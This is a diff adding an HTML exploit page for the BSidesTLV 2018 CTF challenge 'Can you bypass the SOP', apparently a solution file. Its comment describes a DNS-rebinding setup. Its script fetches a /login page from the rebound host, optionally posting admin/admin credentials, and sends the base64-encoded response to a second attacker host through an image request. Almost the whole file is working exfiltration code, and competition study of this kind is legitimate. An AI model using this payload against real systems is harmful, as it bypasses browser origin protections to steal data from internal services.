@@ -1,0 +1,37 @@
+<!-- https://jctf.team/BSidesTLV-2018/Can-you-bypass-the-SOP/
+python -m SimpleHTTPServer 8080 &
+python -m SimpleHTTPServer 8081 &
+make bot visit this at http://bsidestlv.ddns.net:8080/index.html then change bsidestlv.ddns.net to 127.0.0.1 before timeout
+IMPORTANT: ports need to be the same obviously
+-->
+<html>
+  <head></head>
+  <body>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js'></script>
+    <script>      
+      setTimeout(function() {
+        console.log('send request...');
+
+        $.get('http://bsidestlv.ddns.net:8080/login', function(data, status, xhr) {
+          console.log(data);
+          var image = new Image();
+          image.src='http://bsidestlv2.ddns.net:8081/index.html?login='+window.btoa(xhr.responseText);
+        });
+        /* or
+        $.post('http://bsidestlv.ddns.net:8080/login',
+        {
+          username: 'admin',
+          password: 'admin',
+          submit: ''
+        },
+        function(data,status){
+          console.log(data);
+          var image = new Image();
+          image.src='http://bsidestlv2.ddns.net:8081/index.html?login='+window.btoa(data);
+        });
+        */
+
+      },90000); // or use 3' depending on lowest TTL possible supported by provider
+    </script>
+  </body>
+</html>
